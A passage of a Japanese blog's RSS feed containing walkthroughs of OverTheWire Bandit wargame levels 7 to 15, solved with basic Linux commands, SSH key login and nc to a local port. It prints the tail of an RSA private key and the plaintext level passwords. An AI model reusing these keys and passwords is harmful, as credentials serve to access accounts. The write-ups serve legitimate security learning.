o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
bandit13@bandit:~$ exit

# 以下はローカルで
$ touch ~/.ssh/bandit/bandit13.private.pem
$ vim ~/.ssh/bandit/bandit13.private.pem # $cat sshkey.private の結果を貼り付ける
$ chmod 600 ~/.ssh/bandit/bandit13.private.pem
$ ssh -i ~/.ssh/bandit/bandit13.private.pem -l bandit14 -p 2220 bandit.labs.overthewire.org

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;「次のレベルのパスワードはファイルに保存してあるよ、でもこのレベルでは次のレベルのパスワードは手に入れることができないよ」という英語の罠にハマっていました。&lt;/p&gt;
&lt;p&gt;哲学していても仕方ないので、&lt;code&gt;ls&lt;/code&gt;、&lt;code&gt;cat&lt;/code&gt;すると問題文通り秘密鍵が出てきました。おそらくこれを使って&lt;code&gt;bandit14&lt;/code&gt;で&lt;code&gt;ssh&lt;/code&gt;し直すのかなとあたりをつけました。&lt;/p&gt;
&lt;p&gt;秘密鍵をローカルに登録するしたあとに以下のエラー文が表示されました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -i ~/.ssh/bandit/bandit13.private.pem -l bandit14 -p 2220 bandit.labs.overthewire.org                         ?[master]
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0755 for &#39;/Users/taka/.ssh/bandit/bandit13.private.pem&#39; are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &amp;quot;/Users/taka/.ssh/bandit/bandit13.private.pem&amp;quot;: bad permissions
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これは秘密鍵のパーミッションが広すぎる警告です。秘密鍵のパーミッションは&lt;code&gt;600&lt;/code&gt;にする必要があるので、&lt;code&gt;chmod&lt;/code&gt;で直しました。&lt;/p&gt;
&lt;p&gt;ひっかけポイントとしては、ここではパスワードを取得できたら成功で、次のレベルに行きます。このパスワードで&lt;code&gt;ssh -l bandit15 -p 2220 bandit.labs.overthewire.org&lt;/code&gt;しても上手くいかなかったです。これに気づくのに時間をくった。&lt;/p&gt;
&lt;h2 id=&#34;level15&#34;&gt;Level15&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
bandit14@bandit:~$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit15 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit15@bandit.labs.overthewire.org&#39;s password: BfMYroe26WYalil77FoDi9qh59eK5xNr
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;Goalの&lt;code&gt;by submitting the password&lt;/code&gt;の意味をずっと考えていました。30000ポートに入力ってどう言う意味だこれ？&lt;/p&gt;
&lt;p&gt;とりあえず、足掛かりがほしくて、&lt;code&gt;Commands you may need to solve this level&lt;/code&gt;にある接続系のコマンドを調べてました(&lt;code&gt;ssh&lt;/code&gt;, &lt;code&gt;telnet&lt;/code&gt;, &lt;code&gt;nc&lt;/code&gt;・・・)&lt;/p&gt;
&lt;p&gt;そして&lt;code&gt;nc&lt;/code&gt;コマンドに行きつきました。&lt;code&gt;nc&lt;/code&gt;は簡易的なサーバにも、サーバに接続もできるクライアントの役割もできるコマンドのようです。最初、何も表示されないのが怖かったのですが、パスワードを入れたら反応が返ってきました。返ってきてよかったぁ。&lt;/p&gt;
&lt;p&gt;後で調べてみましたが、&lt;code&gt;telnet&lt;/code&gt;でもできました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit14@bandit:~$ telnet localhost 30000
Trying 127.0.0.1...
Connected to localhost.
Escape character is &#39;^]&#39;.
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;Levelが上がるごとに知らない知識が増えてきて、考える時間が増えています。その考える時間が最近は楽しいです。sshの秘密鍵なんかはお仕事でも何度か出てきたので、次からは迷わずに済みそうです。&lt;/p&gt;
&lt;p&gt;全然関係ないですが、“Done is better than perfect.”と言う言葉が好きなので、近々ブログ名をこれに変更するつもりです。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level13</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level13/</link>
        <pubDate>Wed, 16 Jun 2021 22:58:34 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level13/</guid>
        <description>&lt;h2 id=&#34;level-13&#34;&gt;Level 13&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtにある&lt;/li&gt;
&lt;li&gt;&lt;del&gt;data.txtは何回もhexdumpされている&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;data.txtはhexdumpファイルであり、何回も圧縮されている&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:~$ mkdir /tmp/mydir
bandit12@bandit:~$ cp data.txt /tmp/mydir
bandit12@bandit:~$ cd /tmp/mydir
bandit12@bandit:/tmp/mydir$ xxd -r data.txt | gzip -d &amp;gt; data.decompress.txt
bandit12@bandit:/tmp/mydir$ file data.decompress.txt 
data.decompress.txt: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/mydir$ mv data.decompress.txt data.decompress.txt.bz
bandit12@bandit:/tmp/mydir$ bzip2 -d data.decompress.txt.bz
bandit12@bandit:/tmp/mydir$ file data.decompress.txt
data.decompress.txt: gzip compressed data, was &amp;quot;data4.bin&amp;quot;, last modified: Thu May  7 18:14:30 2020, max compression, from Unix
bandit12@bandit:/tmp/mydir$ mv data.decompress.txt data.decompress.txt.gz
bandit12@bandit:/tmp/mydir$ gzip -d data.decompress.txt.gz 
bandit12@bandit:/tmp/mydir$ file data.decompress.txt
data.decompress.txt: POSIX tar archive (GNU)
bandit12@bandit:/tmp/mydir$ tar -xvf data.decompress.txt
data5.bin
bandit12@bandit:/tmp/mydir$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/mydir$ tar -xvf data5.bin
data6.bin
bandit12@bandit:/tmp/mydir$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/mydir$ bzip2 -d data6.bin.bz 
data5.bin  data6.bin  data.decompress.txt  data.decompress.txt.out  data.txt
bandit12@bandit:/tmp/mydir$ file data6.bin
data6.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/mydir$ tar -xvf data6.bin
data8.bin
bandit12@bandit:/tmp/mydir$ file data8.bin
data8.bin: gzip compressed data, was &amp;quot;data9.bin&amp;quot;, last modified: Thu May  7 18:14:30 2020, max compression, from Unix
bandit12@bandit:/tmp/mydir$ file data8.bin
data8.bin: ASCII text
bandit12@bandit:/tmp/mydir$ cat data8.bin 
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
bandit12@bandit:/tmp/mydir$ exit

# 以下ローカルで
❯❯❯ ssh -l bandit13 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit13@bandit.labs.overthewire.org&#39;s password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;h4 id=&#34;異次元の世界へようこそ&#34;&gt;異次元の世界へようこそ&lt;/h4&gt;
&lt;p&gt;いつものように&lt;code&gt;cat data.txt&lt;/code&gt;しましたが&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:~$ cat data.txt 
00000000: 1f8b 0808 0650 b45e 0203 6461 7461 322e  .....P.^..data2.
00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159  bin..=...BZh91AY
00000020: 2653 598e 4f1c c800 001e 7fff fbf9 7fda  &amp;amp;SY.O...........
00000030: 9e7f 4f76 9fcf fe7d 3fff f67d abde 5e9f  ..Ov...}?..}..^.
00000040: f3fe 9fbf f6f1 feee bfdf a3ff b001 3b1b  ..............;.
00000050: 5481 a1a0 1ea0 1a34 d0d0 001a 68d3 4683  T......4....h.F.
00000060: 4680 0680 0034 1918 4c4d 190c 4000 0001  F....4..LM..@...
00000070: a000 c87a 81a3 464d a8d3 43c5 1068 0346  ...z..FM..C..h.F
.
.
.

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;うーん、わからん！&lt;/p&gt;
&lt;p&gt;今まで見たことない形式でした。&lt;code&gt;cat data.txt&lt;/code&gt;で異次元の扉を開けたようです。&lt;/p&gt;
&lt;h4 id=&#34;hexdumpとは16進数ダンプのこと&#34;&gt;hexdumpとは16進数ダンプのこと！&lt;/h4&gt;
&lt;p&gt;そこから離れて、Goalにある&lt;code&gt;hexdump&lt;/code&gt;とは何かを調べました。16進数ダンプのことでした。そこを手がかりに&lt;code&gt;hexdump&lt;/code&gt;コマンドを調べていくうちに、data.txtの右側にある文字はASCII文字だとわかりました。・&lt;/p&gt;
&lt;p&gt;・・・だからなんだっていうんだ。これは糸口になりそうにないです。&lt;/p&gt;
&lt;h4 id=&#34;ぐるぐるたいむ&#34;&gt;ぐるぐるたいむ&lt;/h4&gt;
&lt;p&gt;それに、Goalの&lt;code&gt;which is a hexdump of a file that has been repeatedly compressed.&lt;/code&gt;というところが気になってました。hexdumpコマンドを何回も叩いて圧縮されたのか？とか色々考えてぐるぐるしてました。&lt;/p&gt;
&lt;p&gt;その途中、30分ぐらいずっと&lt;code&gt;hexdump 復元&lt;/code&gt;とかで調べてました。&lt;code&gt;xxd&lt;/code&gt;コマンドとの出会いはそのときです。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;xdd&lt;/code&gt;は&lt;code&gt;hexdump&lt;/code&gt;と似ていて、どちらも16進数ダンプできるコマンドですが、&lt;code&gt;xdd &lt;/code&gt;は&lt;code&gt;-r&lt;/code&gt;でダンプされたものを元に戻すということもできます。そのときは、&lt;code&gt;xdd -r data.txt&lt;/code&gt;としても手がかりはつかめなかったのでスルーしていました。&lt;/p&gt;
&lt;p&gt;また、&lt;code&gt;Commands you may need to solve this level&lt;/code&gt;にある&lt;code&gt;file&lt;/code&gt;コマンドで&lt;code&gt;file data.txt&lt;/code&gt;をしても&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:~$ file data.txt 
data.txt: ASCII text
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;普通のテキストファイルだったので、打つ手がなくなってきました。&lt;/p&gt;
&lt;h4 id=&#34;光が見えてきた&#34;&gt;光が見えてきた&lt;/h4&gt;
&lt;p&gt;ふと、&lt;code&gt;which is a hexdump of a file that has been repeatedly compressed.&lt;/code&gt;の&lt;code&gt;compressed&lt;/code&gt;って圧縮だよな？圧縮ってzipとかかなぁと思って&lt;code&gt;16進数 ダンプ 圧縮&lt;/code&gt;で検索したらようやく糸口を見つけました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q11156143746&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;暗号の解き方教えて下さい&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;このサイトに&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1f8bで始まっているのでgzip圧縮されたファイルのヘックスダンプと予想されます&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;そういえば、data.txtも&lt;code&gt;1f8b&lt;/code&gt;で始まっている！つまり、data.txtはgzipで圧縮されたファイルなのか！？でも&lt;code&gt;file data.txt&lt;/code&gt;での結果はテキストファイルっていう結果だったしな・・・&lt;/p&gt;
&lt;p&gt;・・・data.txt自体はテキストファイルだけど、その中身がgzipで圧縮されているのかもと気づいたときに繋がりました。実際に確かめてみると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/mydir$ xxd -r data.txt | gzip -d &amp;gt; data.decompress.txt
bandit12@bandit:/tmp/mydir$ file data.decompress.txt 
data.decompress.txt: bzip2 compressed data, block size = 900k
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;予想はあってました&lt;/p&gt;
&lt;p&gt;あとはファイルの形式に従ってbzip2やtar、gzipで展開していけばパスワードが取得できました。&lt;/p&gt;
&lt;h4 id=&#34;展開に使ったコマンド&#34;&gt;展開に使ったコマンド&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;bzip
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; : 展開する&lt;/li&gt;
&lt;li&gt;パイプからの標準入力も受け付けることができる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tar
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; : 処理したファイルを一覧表示する&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; : 展開する&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; : アーカイブファイルを指定する&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gzip
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; : 展開する&lt;/li&gt;
&lt;li&gt;パイプからの標準入力も受け付けることができる&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;Level13、かなりの難敵でした。&lt;code&gt;cat&lt;/code&gt;しても「&amp;hellip;で？」っていう状態からのスタートだったのはきつかったです。特に、&lt;code&gt;1f8b&lt;/code&gt;がgzip形式のファイルだと気づくのに時間がかかりました。ダンプされたファイルの初めは意味がわからなくても検索した方がいいと教訓を得ました。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level10〜12</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level10-12/</link>
        <pubDate>Wed, 16 Jun 2021 19:30:01 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level10-12/</guid>
        <description>&lt;h2 id=&#34;level-10&#34;&gt;Level 10&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtの中にある&lt;/li&gt;
&lt;li&gt;人間に読める形式で、いくつかの&amp;quot;=&amp;ldquo;という文字列が前にある&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit9@bandit:~$ strings data.txt | grep &#39;===&#39;
========== the*2i&amp;quot;4
========== password
Z)========== is
&amp;amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
bandit9@bandit:~$ exit

# 以下はローカル
$ ssh -l bandit10 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit10@bandit.labs.overthewire.org&#39;s password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;とりあえず&lt;code&gt;cat data.txt&lt;/code&gt;してみて意味のわからん文字列であることはわかりました。前に&#39;=&amp;lsquo;がついているとのことなので、&lt;code&gt;grep &#39;=&#39; data.txt&lt;/code&gt;してみると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit9@bandit:~$ grep &#39;=&#39; data.txt
Binary file (standard input) matches
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;うーんと思っていると、問題文下の&lt;code&gt;Commands you may need to solve this level&lt;/code&gt;に&lt;code&gt;strings&lt;/code&gt;という文字が目に入ってきました。これどんなコマンドなんだろうと思って試してみると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;andit9@bandit:~$ strings data.txt 
.
.
.

blsN
~U^y
x@nQ
*SF=s
}1:LF
]vur
Emlld
&amp;amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
_Gmz
\Uli,
A5RK
S&#39;$0
&amp;lt;4t&amp;quot;,
4cXO
cj13c:?
&amp;amp;Yra
zEwa
b2+x
z`tlR
o|8M]
.p4Hv
)z&amp;lt;p
S=A.H&amp;amp;^
#hu#
&amp;quot;C}Jy
0R@R_
~KW?
b#Nzx$b
RlG#t]Z}
e790
JzV1O
XEgp
2Q d
z#j\
1Qit
a&#39;b~
bxBB\u$
8Zpc    $FOxF[
ANYwPCpk
Xk]E
bh}s
P&#39;uP
\-A:
sCtY
Z/1x+
ej8z
P&amp;quot;`\XZ
1KOA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;なんかぽいのが出てきた！&lt;/p&gt;
&lt;p&gt;stringsコマンドはバイナリファイルから可読部分を表示できるコマンドのようです。これが問題文の&lt;code&gt;human-readable&lt;/code&gt;につながるわけです。&lt;/p&gt;
&lt;p&gt;あとはこの結果を&lt;code&gt;=&lt;/code&gt;で&lt;code&gt;grep&lt;/code&gt;すれば出てきました！&lt;/p&gt;
&lt;h2 id=&#34;level-11&#34;&gt;Level 11&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt, which contains base64 encoded data&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtにある&lt;/li&gt;
&lt;li&gt;そのファイルはbase64でエンコードされている&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit10@bandit:~$ base64 -d data.txt 
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
bandit10@bandit:~$ exit

# 以下はローカル
❯❯❯ ssh -l bandit11 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit11@bandit.labs.overthewire.org&#39;s password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Commands you may need to solve this level&lt;/code&gt;に&lt;code&gt;base64&lt;/code&gt;コマンドがあるからきっとそれだろうと当たりをつけました。&lt;code&gt;man base64&lt;/code&gt;でデコードするオプションを調べて終わりです。&lt;/p&gt;
&lt;h2 id=&#34;level-12&#34;&gt;Level 12&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtにある&lt;/li&gt;
&lt;li&gt;大文字小文字がそれぞれ13個分ずらされている&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit11@bandit:~$ cat data.txt | tr A-Za-z N-ZA-Mn-za-m
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
bandit11@bandit:~$ exit

❯❯❯ ssh -l bandit12 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit12@bandit.labs.overthewire.org&#39;s password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;問題文を読んで、これはきっとシーザー暗号ような形式になっているのかなと。&lt;code&gt;cat data.txt&lt;/code&gt;してみるとQ.E.D&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit11@bandit:~$ cat data.txt 
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;おそらく&lt;code&gt;The password is hogehoge&lt;/code&gt;のような形式になることはお見通し。問題はその形式に直すコマンドを知らないこと。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;シーザー暗号 linuxコマンド&lt;/code&gt;で検索すると&lt;code&gt;tr&lt;/code&gt;コマンドを使ったものがいくつかヒットした。
そして文字を13文字ずらす方式のことを&lt;code&gt;ROT13&lt;/code&gt;というらしい。&lt;/p&gt;
&lt;p&gt;最終的には以下に解法が載ってました.。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/ROT13&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ROT13&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;tr&lt;/code&gt;は文字の置換をするコマンドですが、&lt;code&gt;A-Za-z N-ZA-Mn-za-m&lt;/code&gt;の意味がわからなかったのでした。少し見方を変えて、置換前と置換後の文字のマッピングであると捉えれば腑に落ちました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 以下のコマンドは同じことをしている
$ tr A-Za-z N-ZA-Mn-za-m
$ tr ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;AはNにVはIに置換されるということです&lt;/p&gt;
&lt;h2 id=&#34;今日はおしまい&#34;&gt;今日はおしまい&lt;/h2&gt;
&lt;p&gt;英語が弱いのでDeepLでがんばりましょう。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level7〜9</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level7-9/</link>
        <pubDate>Wed, 16 Jun 2021 12:39:36 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level7-9/</guid>
        <description>&lt;h2 id=&#34;level-7&#34;&gt;Level 7&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7, owned by group bandit6, 33 bytes in size&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;サーバどこかにある以下の特徴を持ったファイルからパスワードを取得する&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;オーナーが&lt;code&gt;bandit7&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;グループが&lt;code&gt;bandit6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;33バイト&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c -print0 2&amp;gt; /dev/null | xargs -0 -I{} cat {}
cat: {}: No such file or directory
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
bandit6@bandit:~$ exit

# 以下はローカルで
$ ssh -l bandit7 -p 2220 bandit.labs.overthewire.org                                                                                  ?[master]
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit7@bandit.labs.overthewire.org&#39;s password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;普通に&lt;code&gt;find&lt;/code&gt;を行うと検索結果と一緒にPermission deniedが出てしまう&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c
find: ‘/root’: Permission denied
find: ‘/home/bandit28-git’: Permission denied
find: ‘/home/bandit30-git’: Permission denied
find: ‘/home/bandit5/inhere’: Permission denied
find: ‘/home/bandit27-git’: Permission denied
find: ‘/home/bandit29-git’: Permission denied
find: ‘/home/bandit31-git’: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これは標準エラー出力です。 &lt;code&gt;2&amp;gt; /dev/null&lt;/code&gt;とつけて表示されないようにしてあげました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2&amp;gt; /dev/null
/var/lib/dpkg/info/bandit7.password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;あとはこれをパイプして&lt;code&gt;cat&lt;/code&gt;すれば終わりです&lt;/p&gt;
&lt;h2 id=&#34;level-8&#34;&gt;Level 8&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt next to the word millionth&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはdata.txtにある&lt;/li&gt;
&lt;li&gt;その中のmillionthという単語の次にパスワードが書いてある&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
bandit7@bandit:~$ exit

# 以下はローカルで
❯❯❯ ssh -l bandit8 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit8@bandit.labs.overthewire.org&#39;s password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
